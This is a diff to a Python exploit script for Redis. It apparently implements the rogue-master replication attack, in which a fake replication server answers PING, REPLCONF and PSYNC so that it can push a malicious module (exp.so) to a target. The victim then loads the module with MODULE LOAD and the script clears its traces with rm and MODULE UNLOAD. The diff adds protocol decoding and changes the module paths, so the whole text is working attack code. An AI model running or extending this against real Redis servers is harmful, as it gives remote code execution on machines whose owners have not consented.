@@ -19,6 +19,14 @@ def mk_cmd_arr(arr):
 def mk_cmd(raw_cmd):
     return mk_cmd_arr(raw_cmd.split(" "))
 
+def decode_cmd(cmd):
+    if cmd.startswith("*"):
+        raw_arr = cmd.strip().split("\r\n")
+        return raw_arr[2::2]
+    if cmd.startswith("$"):
+        return cmd.split("\r\n", 2)[1]
+    return cmd.strip().split(" ")
+
 def din(sock, cnt):
     msg = sock.recv(cnt)
     if len(msg) < 300:
@@ -71,15 +79,16 @@ class RogueServer:
         self._sock.listen(10)
 
     def handle(self, data):
+        cmd_arr = decode_cmd(data)
         resp = ""
         phase = 0
-        if data.startswith("PING"):
+        if cmd_arr[0].startswith("PING"):
             resp = "+PONG" + CLRF
             phase = 1
-        elif data.startswith("REPLCONF"):
+        elif cmd_arr[0].startswith("REPLCONF"):
             resp = "+OK" + CLRF
             phase = 2
-        elif data.startswith("PSYNC") or data.startwith("SYNC"):
+        elif cmd_arr[0].startswith("PSYNC") or cmd_arr[0].startswith("SYNC"):
             resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
             resp += "$" + str(len(payload)) + CLRF
             resp = resp.encode()
@@ -120,7 +129,7 @@ def runserver(rhost, rport, lhost, lport):
     rogue = RogueServer(lhost, lport)
     rogue.exp()
     sleep(2)
-    remote.do("MODULE LOAD /var/lib/redis/exp.so")
+    remote.do("MODULE LOAD ./exp.so")
     remote.do("SLAVEOF NO ONE")
 
     # Operations here
@@ -128,7 +137,7 @@ def runserver(rhost, rport, lhost, lport):
 
     # clean up
     remote.do("CONFIG SET dbfilename dump.rdb")
-    remote.shell_cmd("rm /var/lib/redis/exp.so")
+    remote.shell_cmd("rm ./exp.so")
     remote.do("MODULE UNLOAD system")
 
 if __name__ == '__main__':
